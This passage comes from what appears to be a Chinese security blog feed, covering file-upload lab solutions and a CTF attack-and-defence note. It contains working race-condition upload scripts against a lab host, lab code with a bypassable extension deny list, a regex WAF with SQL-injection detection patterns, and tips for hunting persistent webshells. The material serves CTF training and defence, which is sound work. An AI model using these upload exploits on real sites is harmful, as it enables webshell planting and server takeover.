"""</span></span><br><span class="line">        code, head, html, redirect, log = hh.http(<span class="string">'http://172.16.5.129/Pass-17/index.php'</span>, raw=raw)</span><br><span class="line">        print(str(code) + <span class="string">"\r"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">                self._get()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>执行之后我们边可以发现在网站uploads目录下出现了我们想要的info.php<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.10.05.png" alt="image"></p><h3 id="0x18-Pass-18"><a href="#0x18-Pass-18" class="headerlink" title="0x18 Pass-18"></a>0x18 Pass-18</h3><p>分析下题目，发现这个过滤只能上传指定文件，又看了apache版本，应该是有个解析漏洞。但是普通上传一个文件会被重命名，重命名后我们就找不到我们上传的shell了，所以我们在这里要让文件上传且不重命名，那么只能通过条件竞争来解决了，修改一下上题的脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.uploadUrl = <span class="string">"http://172.16.5.129/Pass-18/index.php"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"upload file....."</span>)</span><br><span class="line">        hh = hackhttp.hackhttp()</span><br><span class="line">        raw = <span class="string">"""</span></span><br><span class="line"><span class="string">POST /Pass-18/index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.16.5.129</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Referer: http://172.16.5.129/Pass-18/index.php?action=show_code</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------385016806609230031127102121</span></span><br><span class="line"><span class="string">Content-Length: 352</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=95m62gnmge1fp26tg9c8hjj870</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------385016806609230031127102121</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="upload_file"; filename="test.php.7Z"</span></span><br><span class="line"><span class="string">Content-Type: text/php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php phpinfo();?&gt;</span></span><br><span class="line"><span class="string">-----------------------------385016806609230031127102121</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">上传</span></span><br><span class="line"><span class="string">-----------------------------385016806609230031127102121--</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        code, head, html, redirect, log = hh.http(self.uploadUrl, raw=raw)</span><br><span class="line">        print(str(code) + <span class="string">"\r"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">                self._upload()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    threads = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure><p>可以看到只要我们足够快，我们的未重命名的文件就可以存在，哈哈<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-06-18%20%E4%B8%8B%E5%8D%882.35.54.png" alt="image"></p><h3 id="0x19-Pass-19"><a href="#0x19-Pass-19" class="headerlink" title="0x19 Pass-19"></a>0x19 Pass-19</h3><p>分析了一下代码，发现过滤的还是挺严的，但是重命名这里还是有文章可以做的，使用00截断的方式就好了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="0x20-总结"><a href="#0x20-总结" class="headerlink" title="0x20 总结"></a>0x20 总结</h3><p>bypass思路–考虑三个地方的特性：代码、容器、操作系统</p><p>危害–getshell、xss(如果文件名被存入数据库的话，可以造成xss)</p><p>PS:upload-labs的GitHub上写的是不是前端验证看速度，我感觉说的不好，应该右键看眼源码就好了，速度这种东西谁说的准呢。</p><p>最后附一张上传漏洞的脑图<br><img src="http://ok44mzy2k.bkt.clouddn.com/fileupload2.png" alt="image"></p><h3 id="0x21-参考"><a href="#0x21-参考" class="headerlink" title="0x21 参考"></a>0x21 参考</h3><p><a href="https://www.cnblogs.com/engeng/articles/5948089.html" target="_blank" rel="noopener">https://www.cnblogs.com/engeng/articles/5948089.html</a><br><a href="https://paper.tuisec.win/detail/d511228cd560003" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d511228cd560003</a><br><a href="https://paper.tuisec.win/detail/e5e5fd3a08d8ff7" target="_blank" rel="noopener">https://paper.tuisec.win/detail/e5e5fd3a08d8ff7</a><br><a href="http://www.freebuf.com/vuls/128846.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/128846.html</a><br><a href="http://www.freebuf.com/articles/web/54086.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/54086.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;文件上传漏洞可以说是getshell的一种好方式了，也是常见漏洞之一，本文结合&lt;a href=&quot;ht
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF AWD模式攻防Note</title>
    <link href="http://zer0yu.github.io/2018/05/24/ctf-awd-note/"/>
    <id>http://zer0yu.github.io/2018/05/24/ctf-awd-note/</id>
    <published>2018-05-24T11:27:47.000Z</published>
    <updated>2018-12-13T15:01:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-AWD模式"><a href="#0x01-AWD模式" class="headerlink" title="0x01 AWD模式"></a>0x01 AWD模式</h3><p>Attack With Defence，简而言之就是你既是一个hacker，又是一个manager。<br>比赛形式：一般就是一个ssh对应一个web服务，然后flag五分钟一轮，各队一般都有自己的初始分数，flag被拿会被拿走flag的队伍均分，主办方会对每个队伍的服务进行check，check不过就扣分，扣除的分值由服务check正常的队伍均分。</p><h3 id="0x02-出题思路"><a href="#0x02-出题思路" class="headerlink" title="0x02 出题思路"></a>0x02 出题思路</h3><h4 id="1-题目类型"><a href="#1-题目类型" class="headerlink" title="1:题目类型"></a>1:题目类型</h4><p>  1-出题人自己写的cms，为了恶心然后加个so。</p><p>  2-常见或者不常见的cms。</p><p>  3-一些框架漏洞，比如ph师傅挖的CI这种</p><h4 id="2-代码类型"><a href="#2-代码类型" class="headerlink" title="2:代码类型"></a>2:代码类型</h4><p>目前来说，国内比赛依旧是php居多，当然也会有一些别的，比如py，lua这种。</p><h4 id="3-题目漏洞类型"><a href="#3-题目漏洞类型" class="headerlink" title="3:题目漏洞类型"></a>3:题目漏洞类型</h4><p>  1-sqli居多</p><p>  2-文件包含</p><p>  3-各种rce</p><p>  4-文件上传</p><h4 id="4-出题人思路"><a href="#4-出题人思路" class="headerlink" title="4:出题人思路"></a>4:出题人思路</h4><p>为了不让你们这群赛棍把题秒了，我直接放个未公开cms的0day把，算了，要不我自己加点东西。诶，等等，这样是不是有点难了，再放几个比较简单的洞把，直接在index.php或者web根目录下放个shell?</p><h4 id="5-拿flag方式"><a href="#5-拿flag方式" class="headerlink" title="5:拿flag方式"></a>5:拿flag方式</h4><p>1-是向内网一台机器发送http请求，返回请求中包含flag。</p><p>2-是例如/home目录下放置flag文件。</p><h3 id="0x03-防御技巧"><a href="#0x03-防御技巧" class="headerlink" title="0x03 防御技巧"></a>0x03 防御技巧</h3><p>1.分析流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在比赛服务器上抓取流量包</span></span><br><span class="line">sudo tcpdump -s 0 -w flow.pcap port 80</span><br></pre></td></tr></table></figure><p>使用scp写个脚本实时将流量包拷贝到本地用wireshark进行分析</p><p>2.分析日志</p><p>1).<a href="https://github.com/wupco/weblogger" target="_blank" rel="noopener">weblogger</a></p><p>2).<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">LogForensics 腾讯实验室</a></p><p>3).<a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">北风飘然@金乌网络安全实验室</a></p><p>4).<a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">网络ID为piaox的安全从业人员</a></p><p>5).<a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">网络ID：SecSky</a></p><p>6).<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">网络ID：鬼魅羊羔</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志地址</span></span><br><span class="line">/var/<span class="built_in">log</span>/apache2/</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs</span><br><span class="line">/usr/nginx/logs/</span><br></pre></td></tr></table></figure><p>3.打包源码&amp;备份数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打包目录</span></span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 备份指定的多个数据库</span></span><br><span class="line">mysqldump -u root -p --databases choose <span class="built_in">test</span> &gt; /tmp/db.sql</span><br><span class="line"><span class="comment"># 恢复备份，在mysql终端下执行：</span></span><br><span class="line"><span class="comment"># 命令格式：source FILE_PATH</span></span><br><span class="line"><span class="built_in">source</span> ~/db.sql</span><br><span class="line"><span class="comment"># 曾经遇到一个备份有问题可以执行下面</span></span><br><span class="line">mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql</span><br><span class="line"><span class="comment"># 重置mysql密码</span></span><br><span class="line"><span class="comment"># 方法1：用SET PASSWORD命令  </span></span><br><span class="line">mysql&gt; <span class="built_in">set</span> password <span class="keyword">for</span> 用户名@localhost = password(<span class="string">'新密码'</span>);</span><br><span class="line"><span class="comment"># 方法2：用mysqladmin </span></span><br><span class="line">mysqladmin -u用户名 -p旧密码 password 新密码</span><br></pre></td></tr></table></figure><p>4.重置ssh密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ssh登录后执行</span></span><br><span class="line">passwd</span><br></pre></td></tr></table></figure><p>5.部署waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Code By Safe3 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr, $errfile, $errline)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;"</span>;</span><br><span class="line"> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(<span class="string">"customError"</span>,E_ERROR);</span><br><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array($StrFiltValue))</span><br><span class="line">&#123;</span><br><span class="line">    $StrFiltValue=implode($StrFiltValue);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="comment">//slog("&lt;br&gt;&lt;br&gt;操作IP: ".$_SERVER["REMOTE_ADDR"]."&lt;br&gt;操作时间: ".strftime("%Y-%m-%d %H:%M:%S")."&lt;br&gt;操作页面:".$_SERVER["PHP_SELF"]."&lt;br&gt;提交方式: ".$_SERVER["REQUEST_METHOD"]."&lt;br&gt;提交参数: ".$StrFiltKey."&lt;br&gt;提交数据: ".$StrFiltValue);</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"360websec notice:Illegal operation!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">&#125;      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'update360.php'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"请重命名文件update360.php，防止黑客利用&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slog</span><span class="params">($logs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $toppath=$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>].<span class="string">"/log.htm"</span>;</span><br><span class="line">  $Ts=fopen($toppath,<span class="string">"a+"</span>);</span><br><span class="line">  fputs($Ts,$logs.<span class="string">"\r\n"</span>);</span><br><span class="line">  fclose($Ts);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：<br>(1).将waf.php传到要包含的文件的目录<br>(2).在页面中加入防护，有两种做法，根据情况二选一即可：<br>a).在所需要防护的页面加入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_once(&apos;waf.php&apos;);</span><br></pre></td></tr></table></figure><p>就可以做到页面防注入、跨站<br>如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！<br>添加require_once(‘waf.php’);来调用本代码<br>常用php系统添加文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2   \config\config_global.php</span><br><span class="line">Wordpress   \wp-config.php</span><br><span class="line">Metinfo   \include\head.php</span><br></pre></td></tr></table></figure><p>b).在每个文件最前加上代码<br>在php.ini中找到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Automatically add files before or after any PHP document.</span><br><span class="line">auto_prepend_file = 360_safe3.php路径;</span><br></pre></td></tr></table></figure><p>需要注意的是，部署waf可能会导致服务不可用，需要谨慎部署。</p><p>如果不能部署waf我们可以简单的写个apache配置文件来禁止PHP执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html/&quot;&gt;</span><br><span class="line">Options -ExecCGI -Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">php_flag engine off</span><br><span class="line">&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</span><br><span class="line"> deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>6.干掉不死马的方式</p><p>(1).<code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p><p>(2).重启php等web服务</p><p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>(4).创建一个和不死马生成的马一样名字的文件夹。</p><p>7.修改curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> curl=<span class="string">'echo fuckoff'</span>  <span class="comment">#权限要求较低</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">alias</span> curl=<span class="string">'python -c "__import__(\"sys\").stdout.write(\"flag&#123;%s&#125;\\n\" % (__import__(\"hashlib\").md5(\"\".join([__import__(\"random\").choice(__import__(\"string\").letters) for i in range(0x10)])).hexdigest()))"'</span></span><br><span class="line">chmod -x curl  <span class="comment">#权限要求较高</span></span><br><span class="line">/usr/bin  curl路径</span><br></pre></td></tr></table></figure><p>8.用D盾扫描源代码删除后门文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单的查找后门</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'eval('</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'assert('</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'system('</span></span><br></pre></td></tr></table></figure><p>9.查找常见备份文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 例如bak文件</span></span><br><span class="line">find / -name <span class="string">"*.bak"</span></span><br></pre></td></tr></table></figure><p>10.重置web的各种登录密码（如果比赛check认为修改密码算down就不要修改了）</p><p>11.将<code>uploads</code>等文件夹使用<code>chattr</code>对文件底层属性进行控制。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">chattr命令的用法：chattr [ -RVf ] [ -v version ] [ mode ] files…</span><br><span class="line">最关键的是在[mode]部分，[mode]部分是由+-=和[ASacDdIijsTtu]这些字符组合的，这部分是用来控制文件的</span><br><span class="line">属性。</span><br><span class="line"></span><br><span class="line">+ ：在原有参数设定基础上，追加参数。</span><br><span class="line">- ：在原有参数设定基础上，移除参数。</span><br><span class="line">= ：更新为指定参数设定。</span><br><span class="line">A：文件或目录的 atime (access time)不可被修改(modified), 可以有效预防例如手提电脑磁盘I/O错误的发生。</span><br><span class="line">S：硬盘I/O同步选项，功能类似sync。</span><br><span class="line">a：即append，设定该参数后，只能向文件中添加数据，而不能删除，多用于服务器日志文件安全，只有root才能设定这个属性。</span><br><span class="line">c：即compresse，设定文件是否经压缩后再存储。读取时需要经过自动解压操作。</span><br><span class="line">d：即no dump，设定文件不能成为dump程序的备份目标。</span><br><span class="line">i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。i参数对于文件 系统的安全设置有很大帮助。</span><br><span class="line">j：即journal，设定此参数使得当通过mount参数：data=ordered 或者 data=writeback 挂 载的文件系统，文件在写入时会先被记录(在journal中)。如果filesystem被设定参数为 data=journal，则该参数自动失效。</span><br><span 